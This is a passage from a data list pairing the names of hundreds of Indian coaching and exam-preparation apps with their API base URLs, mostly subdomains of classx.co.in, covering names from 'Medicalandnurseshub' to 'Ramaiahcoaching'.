        {"name": "Medicalandnurseshub", "api": "https://medicalnurseshubapi.classx.co.in"},
        {"name": "Medicalpathshala", "api": "https://medicalpathshalaapi.classx.co.in"},
        {"name": "Medinotes", "api": "https://medinotesapi.classx.co.in"},
        {"name": "Medsynapse", "api": "https://medsynapseapi.classx.co.in"},
        {"name": "Mehtaclasses", "api": "https://mehraclassesapi.classx.co.in"},
        {"name": "Mendesuresh", "api": "https://mendesureshapi.classx.co.in"},
        {"name": "Mentor365", "api": "https://mentor365api.classx.co.in"},
        {"name": "Mentormee", "api": "https://mentormeeapi.classx.co.in"},
        {"name": "Mentormeein", "api": "https://mentormeeinapi.classx.co.in"},
        {"name": "Mentorseduserve", "api": "https://mentorseduserveapi.classx.co.in"},
        {"name": "Menttifyin", "api": "https://menttifyinapi.classx.co.in"},
        {"name": "Meomadeeasy", "api": "https://meomadeeasyapi.classx.co.in"},
        {"name": "Meramentor", "api": "https://meramentorapi.classx.co.in"},
        {"name": "Meritova", "api": "https://meritovaapi.classx.co.in"},
        {"name": "Mgacademy", "api": "https://mgacademyapi.classx.co.in"},
        {"name": "Mgclasses", "api": "https://mgclassesapi.classx.co.in"},
        {"name": "Mgcollegemahwadausa", "api": "https://mgcollegemahwadausaapi.classx.co.in"},
        {"name": "Mgconcept", "api": "https://mgconceptapi.classx.co.in"},
        {"name": "Mgics", "api": "https://mgicsappapi.classx.co.in"},
        {"name": "Mgieducation", "api": "https://mgieducationapi.classx.co.in"},
        {"name": "Mgumangstudy", "api": "https://mgumangstudyapi.classx.co.in"},
        {"name": "Mheducationlab", "api": "https://mheducationlabapi.classx.co.in"},
        {"name": "Mheducationlablite", "api": "https://mheducationlabliteapi.classx.co.in"},
        {"name": "Mias", "api": "https://miasappapi.classx.co.in"},
        {"name": "Militaryjawan", "api": "https://militaryjawanapi.classx.co.in"},
        {"name": "Mindacademy", "api": "https://mindacademyapi.classx.co.in"},
        {"name": "Mindexam", "api": "https://mindexamapi.classx.co.in"},
        {"name": "Mindmentors", "api": "https://mindmentorsapi.classx.co.in"},
        {"name": "Mindsetfitness", "api": "https://mindsetfitnessapi.classx.co.in"},
        {"name": "Mindyourmathbykona", "api": "https://mindyourmathbykonaapi.classx.co.in"},
        {"name": "Minilibrary", "api": "https://minilibraryapi.classx.co.in"},
        {"name": "Mishthiclassesjaipur", "api": "https://mishthiclassesjaipurapi.classx.co.in"},
        {"name": "Mission", "api": "https://missionapi.appx.co.in"},
        {"name": "Mission", "api": "https://missionapi.classx.co.in"},
        {"name": "Missionbadlav", "api": "https://missionbadlavapi.classx.co.in"},
        {"name": "Missiondreameducation", "api": "https://missiondreameducationapi.classx.co.in"},
        {"name": "Missionhigh", "api": "https://missionhighapi.classx.co.in"},
        {"name": "Missionkhakionlinelearningapp", "api": "https://missionkhakiapi.classx.co.in"},
        {"name": "Mitexa", "api": "https://mitexaapi.classx.co.in"},
        {"name": "Mjshaikhsenglishacademy", "api": "https://mjshaikhsenglishacademyapi.classx.co.in"},
        {"name": "Mkeducare", "api": "https://mkeducareapi.classx.co.in"},
        {"name": "Mkgyankendra", "api": "https://mkgyankendraapi.classx.co.in"},
        {"name": "Mkmadhavmaths", "api": "https://mkmadhavmathsapi.classx.co.in"},
        {"name": "Mkphysicsclasses", "api": "https://mkphysicsclassesapi.classx.co.in"},
        {"name": "Mksir", "api": "https://mksirapi.classx.co.in"},
        {"name": "Mme", "api": "https://missionmillionenglishapi.classx.co.in"},
        {"name": "Mobileparschool", "api": "https://mobileparschoolapi.classx.co.in"},
        {"name": "Mobishiksha", "api": "https://mobishikshaapi.classx.co.in"},
        {"name": "Mockopedia", "api": "https://mockopediaapi.classx.co.in"},
        {"name": "Mocksadda", "api": "https://mocksaddaapi.classx.co.in"},
        {"name": "Mocksguru", "api": "https://mocksguruapi.classx.co.in"},
        {"name": "Modelmaths", "api": "https://modelmathsapi.classx.co.in"},
        {"name": "Modulationdigital", "api": "https://modulationdigitalapi.classx.co.in"},
        {"name": "Mohandrivezone", "api": "https://mohandrivezoneapi.classx.co.in"},
        {"name": "Moneyfundas", "api": "https://moneyfundasapi.classx.co.in"},
        {"name": "Mpscbyeknathpatiltatya", "api": "https://mpscbyeknathpatiltatyaapi.classx.co.in"},
        {"name": "Mpscguru", "api": "https://mpscguruapi.classx.co.in"},
        {"name": "Mpsclakshya", "api": "https://mpsclakshyaapi.classx.co.in"},
        {"name": "Mpscmadesimple", "api": "https://mpscmadesimpleapi.classx.co.in"},
        {"name": "Mpscmaza", "api": "https://mpscmazaapi.classx.co.in"},
        {"name": "Mpscmentor", "api": "https://mpscmentorapi.classx.co.in"},
        {"name": "Mpscpocketapp", "api": "https://mpscpocketappapi.classx.co.in"},
        {"name": "Mpscstudypoint", "api": "https://mpscstudypointapi.classx.co.in"},
        {"name": "Mrcompetitiveeasylearning", "api": "https://mrcompetitiveeasylearningapi.classx.co.in"},
        {"name": "Mreducare", "api": "https://mreducareapi.classx.co.in"},
        {"name": "Msaclasses", "api": "https://msaclassesapi.classx.co.in"},
        {"name": "Mschool", "api": "https://mschoolapi.classx.co.in"},
        {"name": "Msclasses", "api": "https://msclassesapi.classx.co.in"},
        {"name": "Mseducations", "api": "https://mseducationsapi.classx.co.in"},
        {"name": "Msgurustudy", "api": "https://msgurustudyapi.classx.co.in"},
        {"name": "Mssscnotes", "api": "https://mseducationapi.classx.co.in"},
        {"name": "Mssuccess", "api": "https://mssuccessapi.classx.co.in"},
        {"name": "Mtphysicsclasses", "api": "https://mtphysicsclassesapi.classx.co.in"},
        {"name": "Muditguptaupscprepplatform", "api": "https://muditguptaprepplatformapi.classx.co.in"},
        {"name": "Mukeshpancholiacharyaclasses", "api": "https://acharyaclassesapi.classx.co.in"},
        {"name": "Mukulagrawal", "api": "https://mukulagrawalapi.classx.co.in"},
        {"name": "Murthysenglish", "api": "https://murthyenglishapi.classx.co.in"},
        {"name": "Mvrsuccess", "api": "https://mvrsuccessapi.classx.co.in"},
        {"name": "Mybizkid", "api": "https://mybizkidapi.classx.co.in"},
        {"name": "Myclass", "api": "https://myclassapi.classx.co.in"},
        {"name": "Mycoachingofficialapp", "api": "https://mycoachingofficialappapi.classx.co.in"},
        {"name": "Myenglishiqacademy", "api": "https://myenglishiqacademyapi.classx.co.in"},
        {"name": "Myexam", "api": "https://myexamappapi.classx.co.in"},
        {"name": "Myexamdiary", "api": "https://myexamdiaryapi.classx.co.in"},
        {"name": "Mymentor", "api": "https://mymentorappapi.classx.co.in"},
        {"name": "Mynotes", "api": "https://mynotesapi.classx.co.in"},
        {"name": "Mysaksham", "api": "https://mysakshamapi.classx.co.in"},
        {"name": "Myschool", "api": "https://myschoolapi.classx.co.in"},
        {"name": "Mytestlibrary", "api": "https://mytestlibraryapi.classx.co.in"},
        {"name": "Myupscclass", "api": "https://myupscclassapi.classx.co.in"},
        {"name": "Myvidyarthi", "api": "https://myvidyarthiapi.classx.co.in"},
        {"name": "Naiduexamwarriors", "api": "https://naiduexamwarriorsapi.classx.co.in"},
        {"name": "Naiyapaareducation", "api": "https://naiyapaareducationapi.classx.co.in"},
        {"name": "Nalandaclasses", "api": "https://nalandaclassesapi.classx.co.in"},
        {"name": "Nallurirajeshsirclasses", "api": "https://nallurirajeshsirclassesapi.classx.co.in"},
        {"name": "Namanneducation", "api": "https://namanneducationapi.classx.co.in"},
        {"name": "Namansirmaths", "api": "https://namansirmathsapi.classx.co.in"},
        {"name": "Namastelearning", "api": "https://namastelearningapi.classx.co.in"},
        {"name": "Namasteneetjee", "api": "https://namasteneetjeeapi.classx.co.in"},
        {"name": "Namastesql", "api": "https://namastesqlapi.classx.co.in"},
        {"name": "Namisha", "api": "https://nimishabansalapi.appx.co.in"},
        {"name": "Namoabcacademy", "api": "https://namoabcacademyapi.classx.co.in"},
        {"name": "Nannampoleclimbing", "api": "https://nannampoleclimbingapi.classx.co.in"},
        {"name": "Narayanansirstudycircles", "api": "https://narayanansirstudycirclesapi.classx.co.in"},
            {"name": "Narendrasirsacademy", "api": "https://narendrasiracademyapi.classx.co.in"},
        {"name": "Nareshonlineacademy", "api": "https://nareshonlineacademyapi.classx.co.in"},
        {"name": "Nathpublication", "api": "https://nathpublicationapi.classx.co.in"},
        {"name": "Natrajeducation", "api": "https://natrajeducationapi.classx.co.in"},
        {"name": "Naukriaspirants", "api": "https://naukriaspirantsapi.classx.co.in"},
        {"name": "Naukrijunction", "api": "https://naukrijunctionapi.classx.co.in"},
        {"name": "Naveenreddymath", "api": "https://naveenreddymathapi.classx.co.in"},
        {"name": "Naveentanwaracademy", "api": "https://naveentanwaracademyapi.classx.co.in"},
        {"name": "Navjeevanonlinecampus", "api": "https://navjeevanonlinecampusapi.classx.co.in"},
        {"name": "Navtutor", "api": "https://navtutorapi.classx.co.in"},
        {"name": "Navyugstudyforum", "api": "https://navyugstudyforumapi.classx.co.in"},
        {"name": "Nawala", "api": "https://nawalaapi.classx.co.in"},
        {"name": "Nayanclasses20", "api": "https://nayanclassesapi.classx.co.in"},
        {"name": "Ndcampusthelearningapp", "api": "https://ndcampuslearningapi.classx.co.in"},
        {"name": "Neelamnaidustudycircle", "api": "https://neelamnaidustudycircleapi.classx.co.in"},
        {"name": "Neerajsharmaenglishnew", "api": "https://neerajsharmaenglishapi.classx.co.in"},
        {"name": "Neerajsharmaenglishold", "api": "https://sharmasapi.classx.co.in"},
        {"name": "Neeteasy", "api": "https://neeteasyapi.classx.co.in"},
        {"name": "Neetkakajee", "api": "https://neetkakajeeapi.classx.co.in"},
        {"name": "Neetpathshala", "api": "https://neetpathshalaapi.classx.co.in"},
        {"name": "Neetphysicskota", "api": "https://neetphysicskotaapi.akamai.net.in"},
        {"name": "Neetshastraneetcounselling", "api": "https://neetshastraneetcounsellingapi.classx.co.in"},
        {"name": "Neocollege", "api": "https://neocollegeapi.classx.co.in"},
        {"name": "Neospark", "api": "https://neosparkapi.classx.co.in"},
        {"name": "Newatulyaacademy", "api": "https://newatulyaacademyapi.classx.co.in"},
        {"name": "Newlightclasses", "api": "https://newlightclassesapi.classx.co.in"},
        {"name": "Newutkarshiaspcscoaching", "api": "https://newutkarshcoachingapi.classx.co.in"},
        {"name": "Nexteducation", "api": "https://nexteducationapi.classx.co.in"},
        {"name": "Nglearner", "api": "https://nglearnersapi.classx.co.in"},
        {"name": "Nhmiracleacademy", "api": "https://nhmiracleacademyapi.classx.co.in"},
        {"name": "Niceacademyhaveri", "api": "https://niceacademyhaveriapi.classx.co.in"},
        {"name": "Nicevidyapeeth", "api": "https://nicevidyapeethapi.classx.co.in"},
        {"name": "Nileshclasses", "api": "https://nileshclassesapi.classx.co.in"},
        {"name": "Nirakt", "api": "https://niraktapi.classx.co.in"},
        {"name": "Nirdeshiasclasses", "api": "https://nirdeshiasclassesapi.classx.co.in"},
        {"name": "Nirmanias", "api": "https://nirmaniasapi.classx.co.in"},
        {"name": "Niseeducationhub", "api": "https://niseeducationhubapi.classx.co.in"},
        {"name": "Nishanteacademyeducation", "api": "https://nishanteacademyeducationapi.classx.co.in"},
        {"name": "Nishantsenglish", "api": "https://nishantsenglishapi.classx.co.in"},
        {"name": "Nishchayacademy", "api": "https://nishchayacademyapi.classx.co.in"},
        {"name": "Nishchayiasacademy", "api": "https://nishchayiasacademyapi.classx.co.in"},
        {"name": "Nishtha", "api": "https://nishthaapi.classx.co.in"},
        {"name": "Nishthainstitute", "api": "https://nishthainstituteapi.classx.co.in"},
        {"name": "Niteshsir", "api": "https://niteshsirapi.classx.co.in"},
        {"name": "Nitinsharmamaths", "api": "https://nitinsharmamathsapi.classx.co.in"},
        {"name": "Nobelforensics", "api": "https://nobelforensicsapi.classx.co.in"},
        {"name": "Notebook", "api": "https://notebookapi.classx.co.in"},
        {"name": "Notebookacademy", "api": "https://d1ftpn76h259sr.cloudfront.net"},
        {"name": "Nscareeracademy", "api": "https://nscareeracademyapi.classx.co.in"},
        {"name": "Nskp", "api": "https://nskpapi.classx.co.in"},
        {"name": "Nst", "api": "https://nstapi.classx.co.in"},
        {"name": "Numbersacademy", "api": "https://numbersacademyapi.classx.co.in"},
        {"name": "Nurseasy", "api": "https://nurseasyapi.classx.co.in"},
        {"name": "Nursingtest", "api": "https://nursingtestapi.classx.co.in"},
        {"name": "Nurtureclassesjeeneetboard", "api": "https://nurtureclassesapi.classx.co.in"},
        {"name": "Ocean", "api": "https://oceangurukulsapi.classx.co.in"},
        {"name": "Odiaspacegovtexampreparationapp", "api": "https://odiaspaceapi.classx.co.in"},
        {"name": "Odinsacademy", "api": "https://odinsacademyapi.classx.co.in"},
        {"name": "Odishaexam", "api": "https://odishaexamapi.classx.co.in"},
        {"name": "Odishaexamnew", "api": "https://newodishaexamapi.classx.co.in"},
        {"name": "Olympiadwinner", "api": "https://olympiadwinnerapi.classx.co.in"},
        {"name": "Olympicstudy", "api": "https://olympicstudyapi.classx.co.in"},
        {"name": "Omeducation", "api": "https://omeducationapi.classx.co.in"},
        {"name": "Omtrivediclassesotc", "api": "https://omtrivediclassesapi.classx.co.in"},
        {"name": "Omvisionacademy", "api": "https://omvisionacademyapi.classx.co.in"},
        {"name": "Onedayghar", "api": "https://onedaygharapi.classx.co.in"},
        {"name": "Onekstudy", "api": "https://onekstudyapi.classx.co.in"},
        {"name": "Onlineagriculture", "api": "https://onlineagricultureapi.classx.co.in"},
        {"name": "Onlineclassacademy", "api": "https://onlineclassacademyapi.classx.co.in"},
        {"name": "Onlineeducationapp", "api": "https://onlineeducationapi.classx.co.in"},
        {"name": "Onlinelearning", "api": "https://onlinelearningapi.classx.co.in"},
        {"name": "Onlineolearnonline", "api": "https://onlineolearnonlineanytimeapi.classx.co.in"},
        {"name": "Onlineprep", "api": "https://onlineprepapi.classx.co.in"},
        {"name": "Onlinestudyplatform", "api": "https://onlinestudyplatformapi.classx.co.in"},
        {"name": "Onlinestudypoint", "api": "https://onlinestudypointapi.classx.co.in"},
        {"name": "Onlinestudyzone", "api": "https://onlinestudyzoneapi.classx.co.in"},
        {"name": "Onlinetestbook", "api": "https://onlinetestbookapi.classx.co.in"},
        {"name": "Onlykhakimission", "api": "https://onlykhakimissionapi.classx.co.in"},
        {"name": "Onlystudy", "api": "https://onlystudyapi.classx.co.in"},
        {"name": "Onlytopstudy", "api": "https://onlytopstudyapi.classx.co.in"},
        {"name": "Ooacademypune", "api": "https://ooacademypuneapi.classx.co.in"},
        {"name": "Openstudy", "api": "https://openstudyapi.teachx.in"},
        {"name": "Openstudy", "api": "https://openstudyapi.classx.co.in"},
        {"name": "Optimum", "api": "https://optimumapi.classx.co.in"},
        {"name": "Oraontvjh", "api": "https://oraontvjhapi.classx.co.in"},
        {"name": "Orjaat", "api": "https://orjaatapi.classx.co.in"},
        {"name": "Osnacademy", "api": "https://osnacademyapi.classx.co.in"},
        {"name": "Ourdreammerry", "api": "https://ourdreammerryapi.classx.co.in"},
        {"name": "Ourseducation", "api": "https://ourseducationapi.classx.co.in"},
        {"name": "Ovimet", "api": "https://ovimetapi.classx.co.in"},
        {"name": "Oxfordgsaacademyjaipur", "api": "https://oxfordgsaacademyjaipurapi.classx.co.in"},
        {"name": "Pacificmarineacademy", "api": "https://pacificmarineacademyapi.classx.co.in"},
        {"name": "Padhle", "api": "https://padhleapi.classx.co.in"},
        {"name": "Padhleakshay", "api": "https://padhleakshayapi.classx.co.in"},
        {"name": "Padhoabhiyan", "api": "https://padhoabhiyanapi.classx.co.in"},
        {"name": "Padhreclasses", "api": "https://padhreclassesapi.classx.co.in"},
        {"name": "Padhreiitjam", "api": "https://padhreiitjamapi.classx.co.in"},
        {"name": "Pahelieduplus", "api": "https://pahelieduplusapi.classx.co.in"},
        {"name": "Paidefenceacademy", "api": "https://paidefenceacademyapi.classx.co.in"},
        {"name": "Palakiasacademy", "api": "https://palakiasacademyapi.classx.co.in"},
        {"name": "Panaceaforssc", "api": "https://panaceaforsscapi.classx.co.in"},
        {"name": "Pancholi", "api": "https://acharyaclassesapi.appx.co.in"},
        {"name": "Panchrishiclasses", "api": "https://panchrishiclassesapi.classx.co.in"},
        {"name": "Pandeyjitechnical", "api": "https://pandeyjitechnicalapi.classx.co.in"},
        {"name": "Pankajstudycentre", "api": "https://pankajstudycentreapi.classx.co.in"},
        {"name": "Panoramabykamleshsir", "api": "https://panoramakamleshsirapi.classx.co.in"},
        {"name": "Pantheonedu", "api": "https://pantheoneduapi.classx.co.in"},
        {"name": "Paperhacker", "api": "https://paperhackerapi.classx.co.in"},
        {"name": "Papertickacademy", "api": "https://papertickacademyapi.classx.co.in"},
        {"name": "Parakramacademy", "api": "https://parakramacademyapi.classx.co.in"},
        {"name": "Paramedicalclasses", "api": "https://paramedicalclassesapi.classx.co.in"},
        {"name": "Pareeksharthi", "api": "https://pareeksharthiapi.classx.co.in"},
        {"name": "Pariksha247", "api": "https://pariksha247api.classx.co.in"},
        {"name": "Parikshadham", "api": "https://parikshadhamapi.classx.co.in"},
        {"name": "Parikshagyan", "api": "https://parikshagyanapi.classx.co.in"},
        {"name": "Parikshamunch", "api": "https://parikshamunchapi.classx.co.in"},
        {"name": "Parikshaone", "api": "https://parikshaoneapi.classx.co.in"},
        {"name": "Parikshaplus", "api": "https://parikshaplusapi.classx.co.in"},
        {"name": "Parikshaportal", "api": "https://parikshaportalapi.classx.co.in"},
        {"name": "Parishramupscgpsc", "api": "https://parishramupscgpscapi.classx.co.in"},
        {"name": "Pariskhastudy24", "api": "https://pariskhastudy24api.classx.co.in"},
        {"name": "Parivartanmpscupsc", "api": "https://parivartanmpscupscapi.classx.co.in"},
        {"name": "Parmaracademy", "api": "https://parmaracademyapi.classx.co.in"},
        {"name": "Pashaseconomy20", "api": "https://pashaseconomy20api.classx.co.in"},
        {"name": "Passionenglishstudy", "api": "https://passionenglishstudyapi.classx.co.in"},
        {"name": "Patanjaliiasacademy", "api": "https://patanjaliiasacademyapi.classx.co.in"},
        {"name": "Pathakclasses", "api": "https://pathakclassesapi.classx.co.in"},
        {"name": "Pathshala247Examprep", "api": "https://pathshala247examprepapi.classx.co.in"},
        {"name": "Patiya", "api": "https://patiyaapi.classx.co.in"},
        {"name": "Pavandeshpandesacademy", "api": "https://pavandeshpandeacademyapi.classx.co.in"},
        {"name": "Pawansirbettiah", "api": "https://pawansirbettiahapi.classx.co.in"},
        {"name": "Pcdigital", "api": "https://pcdigitalapi.classx.co.in"},
        {"name": "Pcepanacea", "api": "https://panaceacompetitiveexaminationsapi.classx.co.in"},
        {"name": "Pcmbacademy", "api": "https://pcmbacademyapi.classx.co.in"},
        {"name": "Pcsmantra", "api": "https://pcsmantraapi.teachx.in"},
        {"name": "Pcsmantra", "api": "https://pcsmantraapi.classx.co.in"},
        {"name": "Pdsharmaclasses", "api": "https://pdsharmaclassesapi.classx.co.in"},
        {"name": "Pearlnirmaanclassespnc", "api": "https://pearlnirmaanclassesapi.classx.co.in"},
        {"name": "Pediatricsbydranand", "api": "https://pediatricsdranandapi.classx.co.in"},
        {"name": "Perainstitutepune", "api": "https://perainstitutepuneapi.classx.co.in"},
        {"name": "Perfectcomputerengineer", "api": "https://perfectcomputerengineerapi.classx.co.in"},
        {"name": "Perfectioniasacademy", "api": "https://perfectioniasacademyapi.classx.co.in"},
        {"name": "Perfectswing", "api": "https://perfectswingapi.classx.co.in"},
        {"name": "Perspectiveacademy", "api": "https://perspectiveacademyapi.classx.co.in"},
        {"name": "Pesphankareducationservices", "api": "https://pesphankareducationservicesapi.classx.co.in"},
        {"name": "Pgcambd", "api": "https://pgcambdapi.classx.co.in"},
        {"name": "Pgpointlive", "api": "https://pgpointliveapi.classx.co.in"},
        {"name": "Pharmacadgpatnipermba", "api": "https://pharmacadapi.classx.co.in"},
        {"name": "Pharmacyindia", "api": "https://pharmacyindiaapi.classx.co.in"},
        {"name": "Pharmacypoint", "api": "https://pharmacypointapi.classx.co.in"},
        {"name": "Phoenixacademy", "api": "https://phoenixacademyapi.classx.co.in"},
        {"name": "Phonefixhyd", "api": "https://phonefixhydapi.classx.co.in"},
        {"name": "Phonixacadmy", "api": "https://studypiapi.appx.co.in"},
        {"name": "Photonclasses", "api": "https://photonclassesapi.classx.co.in"},
        {"name": "Physicasingh", "api": "https://physicsasinghsirapi.classx.co.in"},
        {"name": "Physicsbyniteshsir", "api": "https://physicsniteshsirapi.classx.co.in"},
        {"name": "Physicsbypankajsir", "api": "https://physicspankajsirapi.classx.co.in"},
        {"name": "Physicsbysanjaysir", "api": "https://physicssanjaysirapi.classx.co.in"},
        {"name": "Physicsbyshubhamtyagi", "api": "https://physicsshubhamtyagiapi.classx.co.in"},
        {"name": "Physicsfakira", "api": "https://physicsfakiraapi.classx.co.in"},
        {"name": "Physicsgravity", "api": "https://physicsgravityapi.classx.co.in"},
        {"name": "Physicsguru", "api": "https://physicsguruapi.classx.co.in"},
        {"name": "Physicsheistbyprofessor", "api": "https://physicsheistprofessorapi.classx.co.in"},
        {"name": "Physicsmagician", "api": "https://physicsmagicianapi.classx.co.in"},
        {"name": "Physicsmagicianweb", "api": "https://physicsmagicianwebapi.classx.co.in"},
        {"name": "Physicsprobyaksir", "api": "https://physicsproaksirapi.classx.co.in"},
        {"name": "Physicstour", "api": "https://physicstourapi.classx.co.in"},
        {"name": "Physicswithumeshrajoria", "api": "https://physicsumeshrajoriaapi.classx.co.in"},
        {"name": "Pioneeracademy", "api": "https://pioneeracademyapi.classx.co.in"},
        {"name": "Pkagriacademy", "api": "https://pkagriacademyapi.classx.co.in"},
        {"name": "Pksirmaths", "api": "https://pksirmathsapi.classx.co.in"},
        {"name": "Plaintospeak", "api": "https://plaintospeakapi.classx.co.in"},
        {"name": "Planetspike", "api": "https://planetspikeapi.classx.co.in"},
        {"name": "Platform", "api": "https://d2zv7casldjvbj.cloudfront.net"},
        {"name": "Pnextlive", "api": "https://pnextliveapi.classx.co.in"},
        {"name": "Policefactory", "api": "https://policefactoryapi.classx.co.in"},
        {"name": "Polytechnicacademy", "api": "https://polytechnicacademyapi.classx.co.in"},
        {"name": "Polytechnicpathshala", "api": "https://polytechnicpathshalaapi.classx.co.in"},
        {"name": "Powerofprotrading", "api": "https://powerofprotradingapi.classx.co.in"},
        {"name": "Powl", "api": "https://powlapi.classx.co.in"},
        {"name": "Prabalprofessionalacademy", "api": "https://prabalprofessionalacademyapi.classx.co.in"},
        {"name": "Prabhav", "api": "https://prabhavapi.classx.co.in"},
        {"name": "Prabodhfoundation", "api": "https://prabodhfoundationapi.classx.co.in"},
        {"name": "Pracademy", "api": "https://pracademyapi.classx.co.in"},
        {"name": "Prachandprayaspvtltd", "api": "https://prachandprayaspvtltdapi.classx.co.in"},
        {"name": "Practicebook", "api": "https://practicebookapi.classx.co.in"},
        {"name": "Pradeepgirisir", "api": "https://pradeepgiriapi.classx.co.in"},
        {"name": "Pradeepkagat", "api": "https://pradeepkagatapi.classx.co.in"},
        {"name": "Pradhitclassesliveclassespdf", "api": "https://pradhitclassesliveclassespdfapi.classx.co.in"},
        {"name": "Pragaticlassesudaipur", "api": "https://pragaticlassesudaipurapi.classx.co.in"},
        {"name": "Pragaticoaching", "api": "https://pragaticoachingapi.classx.co.in"},
        {"name": "Pragyaeducation", "api": "https://pragyaeducationapi.classx.co.in"},
        {"name": "Prajadefence", "api": "https://prajadefenceapi.classx.co.in"},
        {"name": "Prakashinstitute", "api": "https://prakashinstituteapi.classx.co.in"},
        {"name": "Prakashsirmaths", "api": "https://prakashsirmathsapi.classx.co.in"},
        {"name": "Prakhar", "api": "https://prakharapi.classx.co.in"},
        {"name": "Pramakhilclasses", "api": "https://pramakhilclassesapi.classx.co.in"},
        {"name": "Pramodsarangclasses", "api": "https://pramodsarangclassesapi.classx.co.in"},
        {"name": "Prasadacademyofficial", "api": "https://prasadacademyofficialapi.classx.co.in"},
        {"name": "Prashantchaturvedi", "api": "https://prashantchaturvediapi.classx.co.in"},
        {"name": "Prashareducare", "api": "https://prashareducareapi.classx.co.in"},
        {"name": "Pratapacademy", "api": "https://pratapacademyapi.classx.co.in"},
        {"name": "Pratapcampus", "api": "https://pratapcampusapi.classx.co.in"},
        {"name": "Prathamacademy", "api": "https://prathamacademyapi.classx.co.in"},
        {"name": "Pratigyaclasses", "api": "https://pratigyaclassesapi.classx.co.in"},
        {"name": "Pratigyaclassesjodhpur", "api": "https://pratigyaclassesjodhpurapi.classx.co.in"},
        {"name": "Pratigyalearningapp", "api": "https://pratigyalearningappapi.classx.co.in"},
        {"name": "Pratikbhad", "api": "https://pratikbhadapi.classx.co.in"},
        {"name": "Pratiyogitaghatnachakra", "api": "https://pratiyogitaghatnachakraapi.classx.co.in"},
        {"name": "Pravinchormalesmasterclass", "api": "https://pravinchormalesmasterclassapi.classx.co.in"},
        {"name": "Pravinkadsclasses", "api": "https://pravinkadsclassesapi.classx.co.in"},
        {"name": "Prayagfoundationindore", "api": "https://prayagfoundationindoreapi.classx.co.in"},
        {"name": "Prayagiasacademy", "api": "https://prayagiasacademyapi.classx.co.in"},
        {"name": "Prayagrajgsresearchcenter", "api": "https://prayagrajgsresearchcenterapi.classx.co.in"},
        {"name": "Prayasinstitute", "api": "https://prayasinstituteapi.classx.co.in"},
        {"name": "Prayasinstituteofagriculture", "api": "https://prayasinstituteofagricultureapi.classx.co.in"},
        {"name": "Prbankingadda", "api": "https://prbankingaddaapi.classx.co.in"},
        {"name": "Prepfusion", "api": "https://prepfusionapi.classx.co.in"},
        {"name": "Prepgyan", "api": "https://prepgyanapi.classx.co.in"},
        {"name": "Prepkar", "api": "https://prepkarapi.classx.co.in"},
        {"name": "Primepostalacademy", "api": "https://primepostalacademyapi.classx.co.in"},
        {"name": "Primeprofessionalclassesppc", "api": "https://primeprofessionalclassesppcapi.classx.co.in"},
        {"name": "Princedefenceacademy", "api": "https://princedefenceacademyapi.classx.co.in"},
        {"name": "Prishaias", "api": "https://prishaiasapi.classx.co.in"},
        {"name": "Priyeshsirvidyapeeth", "api": "https://priyeshsirvidyapeethapi.classx.co.in"},
        {"name": "Proeduhut", "api": "https://proeduhutapi.classx.co.in"},
        {"name": "Professionalcommerce", "api": "https://professionalcommerceapi.classx.co.in"},
        {"name": "Profinserv", "api": "https://profinservapi.classx.co.in"},
        {"name": "Proggapon", "api": "https://proggaponapi.classx.co.in"},
        {"name": "Provekarexam", "api": "https://provekarexamapi.classx.co.in"},
        {"name": "Psc", "api": "https://pscmantraapi.classx.co.in"},
        {"name": "Psibaba", "api": "https://psibabaapi.classx.co.in"},
        {"name": "Psychologytrading", "api": "https://psychologytradingapi.classx.co.in"},
        {"name": "Ptech", "api": "https://ptechapi.classx.co.in"},
        {"name": "Ptscadexpert", "api": "https://ptscadexpertapi.classx.co.in"},
        {"name": "Pulseaiims", "api": "https://pulseaiimsapi.classx.co.in"},
        {"name": "Puneetsirreasoning", "api": "https://puneetsirreasoningapi.classx.co.in"},
        {"name": "Purnaeducare", "api": "https://purnaeducareapi.classx.co.in"},
        {"name": "Purplehat", "api": "https://purplehatapi.classx.co.in"},
        {"name": "Qualitypluseducation", "api": "https://qualitypluseducationapi.classx.co.in"},
        {"name": "Quantachemistry", "api": "https://quantachemistryapi.teachx.in"},
        {"name": "Quantachemistryofficial", "api": "https://quantachemistryapi.classx.co.in"},
        {"name": "Quantapoint", "api": "https://quantapointapi.classx.co.in"},
        {"name": "Quantezy", "api": "https://quantezyapi.classx.co.in"},
        {"name": "Quickermaths", "api": "https://quickermathsapi.classx.co.in"},
        {"name": "Quizmaster", "api": "https://quizmasterapi.classx.co.in"},
        {"name": "R2Cacademy", "api": "https://r2cacademyapi.classx.co.in"},
        {"name": "Radhekrishnaacademyeducationapp", "api": "https://radhekrishnaacademyeducationappapi.classx.co.in"},
        {"name": "Radhinaquants", "api": "https://radhinaquantsapi.classx.co.in"},
        {"name": "Raghuramsacademy", "api": "https://raghuramsacademyapi.classx.co.in"},
        {"name": "Rahi", "api": "https://rahiappapi.classx.co.in"},
        {"name": "Rahmaniayurveda", "api": "https://rahmaniayurvedaapi.classx.co.in"},
        {"name": "Rahmanpathan", "api": "https://rahmanpathanapi.classx.co.in"},
        {"name": "Rahuldeshwalacademytoptak", "api": "https://rahuldeshwalacademyapi.classx.co.in"},
        {"name": "Rahulscienceacademy", "api": "https://rahulscienceacademyapi.classx.co.in"},
        {"name": "Railwayadda24", "api": "https://railwayadda24api.classx.co.in"},
        {"name": "Raithan", "api": "https://raithanapi.classx.co.in"},
        {"name": "Rajasthan360", "api": "https://rajasthan360api.classx.co.in"},
        {"name": "Rajclassesbansur", "api": "https://rajclassesbansurapi.classx.co.in"},
        {"name": "Rajeevacademy", "api": "https://rajeevacademyapi.classx.co.in"},
        {"name": "Rajeshbharate", "api": "https://rajeshbharateapi.classx.co.in"},
        {"name": "Rajfashionmaker", "api": "https://rajfashionmakerapi.classx.co.in"},
        {"name": "Rajhansshorthandclasses", "api": "https://rajhansshorthandclassesapi.classx.co.in"},
        {"name": "Rajkumarbandalsacademy", "api": "https://rajkumarbandalsacademyapi.classx.co.in"},
        {"name": "Rajmudraiasacademy", "api": "https://rajmudraiasacademyapi.classx.co.in"},
        {"name": "Rajmudralatur", "api": "https://rajmudralaturapi.classx.co.in"},
        {"name": "Rajnishsharmaclasses", "api": "https://rajnishsharmaclassesapi.classx.co.in"},
        {"name": "Rajpootananotes", "api": "https://rajpootananotesapi.classx.co.in"},
        {"name": "Rajsevaclasses", "api": "https://rajsevaclassesapi.classx.co.in"},
        {"name": "Rakeshsirmathsclasses", "api": "https://rakeshsirmathsclassesapi.classx.co.in"},
        {"name": "Rakshitsingh", "api": "https://rakshitsinghapi.classx.co.in"},
        {"name": "Ramaiahcoaching", "api": "https://ramaiahcoachingapi.classx.co.in"},
